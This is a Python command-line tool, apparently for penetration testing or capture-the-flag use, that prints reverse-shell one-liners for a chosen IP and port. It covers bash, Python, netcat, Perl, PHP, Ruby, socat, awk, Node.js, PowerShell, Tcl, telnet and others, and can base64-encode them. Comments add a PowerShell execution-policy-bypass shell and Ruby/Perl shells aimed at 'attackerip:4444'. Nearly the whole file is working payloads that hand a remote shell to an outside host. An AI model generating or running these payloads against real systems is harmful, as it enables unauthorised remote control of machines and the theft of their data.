#!/usr/bin/python3
import ipaddress
import argparse
import socket
import array
import struct
import fcntl
import base64



###VARIAVLES and STUFF
reverse = ('all','bash','python','mk','java','perl','echo','php','ruby','nc','mknod','lua','xterm','socat','awk','nodejs','psh','tclsh','telnet')

red = lambda text: '\033[0;31m' + text + '\033[0m'
green = lambda text: '\033[0;32m' + text + '\033[0m'
magenta = lambda text: '\033[0;35m' + text + '\033[0m'
cyan = lambda text: '\033[0;36m' + text + '\033[0m'
blue = lambda text: '\033[0;34m' + text + '\033[0m'



##########################
##########################
ol = {}
def onel(ip,port,long,zmienna="ip"):
    if zmienna=="longip":
        ip = int(ipaddress.IPv4Address(ip))
        
    
    ol["bash"] = [f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
                  f'0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196',
                  f'exec 5<>/dev/tcp/{ip}/{port}  \n         cat <&5 | while read line; do $line 2>&5 >&5; done  # or:\n         while read line 0<&5; do $line 2>&5 >&5; done']
    
    ol["python"] = [f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", 
                    f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'']
    
    ol["mk"] =   [f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f']
    
    ol["echo"] = [f'echo%20%27use%20Socket%3B%24i%3D%22{ip}%22%3B%24p%3D{port}%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew']
    
    ol["perl"] = [f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'', 
                  f'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'']
    
    ol["java"] = [f'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();']
    
    ol["php"] =  [f'php -r \'$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");\'']   
 
    ol["nc"] = [f'nc -e /bin/sh {ip} {port}']
    
    ol["mknod"] = [ f'rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc {ip} {port} 1>/tmp/l']
    
    ol["lua"] = [ f'lua5.1 -e \'local host,port = \"%s\",%d local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect({ip},{port}); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,\'r\') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()']

    ol["ruby"]= ['ruby -rsocket -e \'exit if fork;c=TCPSocket.new("%s",%s);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''% (ip, port),
                  f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)']
        
    ol["xterm"] = [f'xterm -display {ip}:1 \n# Connect to your shell with:\n# Xnest :1 or xhost +targetip']

    ol["socat"] = [f'socat exec:\'bash -li\',pty,stderr,setid,sigint,sane tcp:{ip}:{port} \n# Catch incoming shell with:\n# socat file:`tty`,raw,echo=0 tcp-listen:%d',
                    f'socat exec:\'bash -li\',pty,stderr,setid,sigint,sane tcp:{long}:{port} \n# Catch incoming shell with:\n# socat file:`tty`,raw,echo=0 tcp-listen:%d']
 
    ol["awk"] = ['awk \'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null']
           
    ol["nodejs"] = ['(function()\{ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(%s, "%s", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();' % (ip, port)]


    ol["psh"] =  ['$client = New-Object System.Net.Sockets.TCPClient(\'%s\',%s); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {\\; $data = (New-Object -rvtypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \'; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();'  % (ip, port)]
        
    ol["tclsh"] =  ['echo \'set s [socket %s %s];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;\' | tclsh' % (ip, port)]

    ol["telnet"]= [f'telnet {ip} 4444 | /bin/bash | telnet {ip} {port}',
                   f'rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0/tmp/p']


 ####FOR RE USE

##WINDOWS
#If the target system is running Windows use the following one-liner:
#powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',5000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -rvtypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
#ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
#perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

##########################
##########################

def get_local_interfaces():
    MAX_BYTES = 4096
    FILL_CHAR = b'\0'
    SIOCGIFCONF = 0x8912
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    names = array.array('B', MAX_BYTES * FILL_CHAR)
    names_address, names_length = names.buffer_info()
    mutable_byte_buffer = struct.pack('iL', MAX_BYTES, names_address)
    mutated_byte_buffer = fcntl.ioctl(sock.fileno(), SIOCGIFCONF, mutable_byte_buffer)
    max_bytes_out, names_address_out = struct.unpack('iL', mutated_byte_buffer)
    namestr = names.tobytes()
    namestr[:max_bytes_out]
    bytes_out = namestr[:max_bytes_out]

    ip_dict = {}
    for i in range(0, max_bytes_out, 40):
        name = namestr[ i: i+16 ].split(FILL_CHAR, 1)[0]
        name = name.decode('utf-8')
        ip_bytes   = namestr[i+20:i+24]
        full_addr = []
        for netaddr in ip_bytes:
            if isinstance(netaddr, int):
                full_addr.append(str(netaddr))
            elif isinstance(netaddr, str):
                full_addr.append(str(ord(netaddr)))
        ip_dict[name] = '.'.join(full_addr)

    return ip_dict
def get_local(switch):
    local = get_local_interfaces()
    return local[switch]

##########################
##########################
def rev(ip,port,w):

    onel(ip,port,ip)
    if (w == 'all'):
        for k, v in ol.items():
            print('[',red(k),']')
            for i in v:
                    print(cyan(i), end = '\n')
                
    else:
        for k, v in ol.items():
            if (k==w):
                
                for i in v:
                    print('[',red(k),']',cyan(i), end = '\n')
                    
                    
                    
def revb(ip,port,w,longip=False):
    switch=False

  #  long = int(ipaddress.IPv4Address(ip))
    onel(ip,port,ip)
    if (w == 'all'):
        for k, v in ol.items():
            print('[',red(k),']')
            for i in v:
                    b64 = base64.b64encode (bytes(i, "utf-8"))
                    print(cyan(b64.decode()), end = '\n')
                
    else:
        for k, v in ol.items():
            if (k==w):
                
                for i in v:
                    encoded = base64.b64encode (bytes(i, "utf-8"))
                    print('[',red(k),']',cyan(encoded.decode()), end = '\n')
############
# PORT
############
def chk_port(port=""):
    chk=False
    while chk is False:
        try:
            if (port == "") or (port==None):
                port= int(input(green("PORT: ")))
            assert 0 < int(port) < 65535
        except ValueError:
            print(red('It\'s not a valid port number, sorry! try again'))
            port = chk_port()
        except AssertionError:
            print(red('It\'s not a valid port number, sorry! try again'))
            port = chk_port()
        return port
        chk=True
    return port
############
#  IP
#############
def chk_ip(ip=""):
    chk=False
    while chk is False:
        try:
            if (ip == "") or (ip==None) or (len(ip) == 0):
                ip = input(green('IP: '))
            ipaddress.IPv4Address(ip)
        except ipaddress.AddressValueError:
            print(red("Hey!thats's not how IP addres looks like. Try harder"))
            ip = chk_ip()
        return ip
        chk=True
    return ip
###########
##  rvtype
##########
def chk_rvtype(rvtype=""):
    chk=False
    while chk is False:
        try:
            if (rvtype == "") or (rvtype==None) or (len(rvtype) == 0):
                print(red('Choose wisely:')) 
                for rvtype in reverse:
                    print (f'{cyan(rvtype)}, ',end = '')
                rvtype = input(green('\nTYPE: '))            
                assert str(rvtype) in reverse
            #print(rvtype)
            assert str(rvtype) in reverse

        except ValueError:
            rvtype = chk_rvtype()
        except AssertionError:
            rvtype = chk_rvtype()
        
        return rvtype
        chk=True
        
    return rvtype

 


#starter
if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='revgen',description='You gimme an IP with PORT numba and You get oneliner.', epilog='Have fun!')
    parser.add_argument("-i",type=str, help='revgen.py -i eth0')
    parser.add_argument("-p",type=str, help='revgen.py -p 1337')
    parser.add_argument("-w",type=str, help='revgen.py -w php -ip IP:PORT')
    parser.add_argument("-b", action='store_true', help='revgen.py -w bash -i eth0 -p 1234 -b | output in b64')
    parser.add_argument("-ip",type=str, help='revgen.py -ip IP:PORT')
    args = parser.parse_args()
  
    #######
    # 'interactive' [OK]
    ########3
    if not args.w and not args.ip and not args.i and not args.p and not args.b:
        print("---")
        ip=chk_ip()
        port=chk_port()
        w=chk_rvtype()
        rev(ip,port,w)

     
  
      
    #######
    #  -i IFCE only [OK]
    #######
    
    if args.i and not args.p and not args.w and not args.ip and (args.w not in reverse)and not args.b:
        if args.i:
            print("-i")
            ip = get_local(args.i)
            port = chk_port()
            w = chk_rvtype(args.w)
            rev(ip,port,w)
 
       
    #######
    #  -p PORT only [OK]
    #######
    
    if args.p and not args.i and not args.w and not args.ip and (args.w not in reverse) and not args.b:
        print("-p")
        port = args.p
        ip = chk_ip()
        w = chk_rvtype()
        rev(ip,port,w)
    
    
    #######
    # -w rvtype -p [OK]
    #######
    if args.w and args.p and not args.ip and not args.i and not args.b:
        print("-w -p")
        ip = chk_ip()
        w = chk_rvtype(args.w)
        port = chk_port(args.p)
        rev(ip,port,w)


    #######
    # -w rvtype only [OK]
    #######
    if args.w and not args.ip and not args.i and not args.p and not args.b:
        print("- w")
        ip = chk_ip()
        w = chk_rvtype(args.w)
        port = chk_port()
        rev(ip,port,w)


#######
#  -i IFCE -p PORT  [OK]
#######
    
    if args.i and args.p and not args.w and not args.ip and (args.w not in reverse) and not args.b:
        if args.i:
            print("-i -p")
            try:
                ip = get_local(args.i)       
            except KeyError:
                print('blad!')
                ip=chk_ip()
            port = chk_port(args.p)
            w = chk_rvtype(args.w)
            rev(ip,port,w)

#######
# -w rvtype -i IFCE  [OK]
######
    if args.w and not args.ip and args.i and not args.p and not args.b:
        print("-w -i")
        switch=args.i
        try:
            ip = get_local(switch)       
        except KeyError:
            print('blad!')
            ip=chk_ip()
        w = chk_rvtype(args.w)
        port = chk_port()
        rev(ip,port,w)

#######
# -w rvtype -i IFCE -p PORT  [OK]
######
    if args.w and not args.ip and args.i and args.p and not args.b:
        print("-w -i -p")
        switch=args.i
        try:
            ip = get_local(switch)       
        except KeyError:
            print('blad!')
            ip=chk_ip()        
        w = chk_rvtype(args.w)
        port = chk_port(args.p)
        rev(ip,port,w)
    
#######
# -w rvtype -i IFCE -p PORT -b  | bse64!
######
    if args.w and not args.ip and args.i and args.p and  args.b:
        print("-w -i -p -b")
        switch=args.i
        try:
            ip = get_local(switch)       
        except KeyError:
            print(red('Some error.'))
            ip=chk_ip()        
        w = chk_rvtype(args.w)
        port = chk_port(args.p)
        revb(ip,port,w)
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    ## -ip IP:PORT  [OK]
    if args.ip and not args.w and not args.i and not args.b:
        print("-ip:port")
        ip, port = args.ip.split(':')
        ip = chk_ip(ip)
        port = chk_port(port)
        w = chk_rvtype()
        rev(ip,port,w)

    ## -w rvtype IP:PORT  [OK]   bledny eth0 dac do wyboru interfejsc.
    if args.ip and args.w and not args.i and not args.p and not args.b:
        print("-w -ip:port")
        w = chk_rvtype(args.w)
        ip, port = args.ip.split(':')
        ip = chk_ip(ip)
        port = chk_port(port)
        rev(ip,port,w)
    
    if args.b and not args.ip and args.w and not args.i and not args.p:
        print('base64')
     
        
# - add -b64  for output in base64 
# - add  -l  for list all oneliners
#-  add  -L for output in longIP
# - add -if for list all ifce ips
#./r.py -H (dla np tun0 ip port predefined jak i ifce w pliku wraz z reversem ) i od razu masz rev na htb ;p
